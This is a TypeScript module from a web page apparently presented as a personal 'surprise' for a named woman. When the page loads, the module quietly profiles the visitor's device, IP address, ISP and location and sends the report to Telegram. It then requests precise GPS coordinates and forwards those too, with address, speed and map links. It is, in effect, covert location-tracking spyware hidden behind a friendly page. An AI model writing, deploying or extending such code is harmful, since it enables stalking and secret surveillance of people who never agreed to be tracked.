/**
 * ─────────────────────────────────────────────────────────────
 * Visitor Intelligence & Telemetry Coordinator
 *
 * Automatically captures visitor hardware, OS, phone model,
 * IP-based location, and high-accuracy GPS coordinates, then
 * transmits the structured profile to Telegram.
 * ─────────────────────────────────────────────────────────────
 */

import { getDeviceSpecs, type DeviceSpecs } from "./device";
import { fetchIpLocation, requestGpsLocation, type IpLocation, type GpsLocation } from "./location";
import { notify, notifyLocation, escapeHtml } from "./telegram";
import { content } from "./content";

let hasTrackedArrival = false;
let hasTrackedGps = false;

/**
 * Builds a structured, beautiful HTML report for Telegram with all device & IP metrics.
 */
function buildArrivalMessage(specs: DeviceSpecs, ipLoc: IpLocation | null): string {
  const brandModel = specs.model.toLowerCase().includes(specs.brand.toLowerCase())
    ? specs.model
    : `${specs.brand} — ${specs.model}`;

  const browserDisplay = specs.isInAppBrowser
    ? `📱 <b>${specs.inAppName || "In-App"}</b> ichki brauzeri (${specs.browser} ${specs.browserVersion})`
    : `${specs.browser} ${specs.browserVersion}`;

  let lines: string[] = [
    `🔔 <b>YANGI TASHRIFCHI SAYTGA KIRDI!</b> (${content.herName} surprise)`,
    "",
    "📱 <b>QURILMA MA'LUMOTLARI:</b>",
    `• <b>Model / Qurilma:</b> <code>${escapeHtml(brandModel)}</code>`,
    `• <b>Brend & Turi:</b> ${escapeHtml(specs.brand)} (${escapeHtml(specs.deviceType)})`,
    `• <b>Tizim (OS):</b> <code>${escapeHtml(specs.os)}</code>`,
    `• <b>Brauzer:</b> ${browserDisplay}`,
    `• <b>Ekran o'lchami:</b> ${specs.screenResolution} (Viewport: ${specs.viewportSize}, @${specs.devicePixelRatio}x)`,
    `• <b>Orientatsiya:</b> ${specs.orientation === "portrait" ? "Portret (tik)" : "Albom (yotiq)"}`,
  ];

  if (specs.gpuRenderer) {
    lines.push(`• <b>Grafika (GPU):</b> <code>${escapeHtml(specs.gpuRenderer)}</code>`);
  }

  if (specs.batteryStatus) {
    lines.push(`• <b>Batareya:</b> ${escapeHtml(specs.batteryStatus)}`);
  }

  if (specs.networkConnection) {
    lines.push(`• <b>Internet aloqasi:</b> ${escapeHtml(specs.networkConnection)}`);
  }

  if (specs.cpuCores || specs.deviceMemory) {
    const hwParts: string[] = [];
    if (specs.cpuCores) hwParts.push(`${specs.cpuCores} CPU yadro`);
    if (specs.deviceMemory) hwParts.push(`${specs.deviceMemory} RAM`);
    lines.push(`• <b>Uskuna (Hardware):</b> ${escapeHtml(hwParts.join(" / "))}`);
  }

  lines.push(`• <b>Til & Vaqt:</b> ${escapeHtml(specs.language)} | ${escapeHtml(specs.localTime)}`);
  lines.push(`• <b>Vaqt mintaqasi:</b> ${escapeHtml(specs.timezone)}`);

  lines.push("");
  lines.push("🌍 <b>IP BO'YICHA MANZIL (Taxminiy):</b>");

  if (ipLoc) {
    lines.push(`• <b>IP Manzil:</b> <code>${escapeHtml(ipLoc.ip)}</code>`);
    const locParts = [ipLoc.city, ipLoc.region, ipLoc.country].filter(Boolean);
    if (locParts.length > 0) {
      lines.push(`• <b>Joylashuv:</b> ${escapeHtml(locParts.join(", "))}`);
    }
    if (ipLoc.isp || ipLoc.org) {
      lines.push(`• <b>Internet Provayder:</b> ${escapeHtml(ipLoc.isp || ipLoc.org || "")}`);
    }
    if (ipLoc.mapUrl) {
      lines.push(`• <b>Taxminiy xarita:</b> <a href="${ipLoc.mapUrl}">Google Maps orqali ko'rish</a>`);
    }
  } else {
    lines.push("• <i>IP joylashuvni aniqlab bo'lmadi (lokal tarmoq yoki cheklangan).</i>");
  }

  lines.push("");
  lines.push("🛰 <i>Aniq GPS koordinatalari aniqlanmoqda...</i>");

  return lines.join("\n");
}

/**
 * Builds the GPS high-accuracy coordinates report.
 */
function buildGpsMessage(gps: GpsLocation): string {
  let lines: string[] = [
    "🎯 <b>ANIQ GPS JOYLANSHUV TOPILDI!</b>",
    "",
  ];

  if (gps.address) {
    lines.push(`📍 <b>Aniq manzil:</b> <code>${escapeHtml(gps.address)}</code>`);
  }

  lines.push(`🎯 <b>Aniqlik darajasi:</b> ±${gps.accuracy} metr ichida`);
  lines.push(`🌐 <b>Koordinatalar:</b> <code>${gps.latitude.toFixed(6)}, ${gps.longitude.toFixed(6)}</code>`);

  if (gps.altitude !== null && gps.altitude !== undefined) {
    lines.push(`⛰ <b>Balandlik:</b> ${Math.round(gps.altitude)} metr dengiz sathidan`);
  }

  if (gps.speed !== null && gps.speed !== undefined && gps.speed > 0) {
    const kmh = (gps.speed * 3.6).toFixed(1);
    lines.push(`🚗 <b>Harakat tezligi:</b> ~${kmh} km/soat`);
  }

  lines.push("");
  lines.push("🗺 <b>XARITALARDA KO'RISH:</b>");
  lines.push(`• <a href="${gps.googleMapUrl}">Google Maps'da ochish</a>`);
  lines.push(`• <a href="${gps.yandexMapUrl}">Yandex Maps'da ochish</a>`);
  lines.push(`• <a href="${gps.appleMapUrl}">Apple Maps'da ochish</a>`);

  return lines.join("\n");
}

/**
 * Executes full visitor tracking:
 * 1. Device Specs + IP Geolocation -> Telegram Message
 * 2. High-Accuracy GPS -> Telegram sendLocation + Pin Message
 */
export async function trackVisitorArrival(): Promise<void> {
  if (typeof window === "undefined" || hasTrackedArrival) return;
  hasTrackedArrival = true;

  try {
    // Collect device specs and IP location concurrently
    const [specs, ipLoc] = await Promise.all([
      getDeviceSpecs(),
      fetchIpLocation().catch(() => null),
    ]);

    // Send initial rich report
    const message = buildArrivalMessage(specs, ipLoc);
    notify(message);

    // Simultaneously attempt GPS location
    void trackGpsCoordinates();
  } catch (error) {
    console.error("[Telemetry] Failed to track visitor:", error);
  }
}

/**
 * Requests GPS coordinates and sends them via Telegram.
 * Can be called automatically on load, or upon first user interaction (tap/click).
 */
export async function trackGpsCoordinates(): Promise<boolean> {
  if (typeof window === "undefined" || hasTrackedGps) return false;

  try {
    const gps = await requestGpsLocation(12000);
    if (!gps) {
      return false;
    }

    hasTrackedGps = true;

    // 1. Send native Telegram GPS pin card
    notifyLocation(gps.latitude, gps.longitude, gps.accuracy);

    // 2. Send detailed address and links
    const gpsMsg = buildGpsMessage(gps);
    notify(gpsMsg);

    return true;
  } catch {
    return false;
  }
}
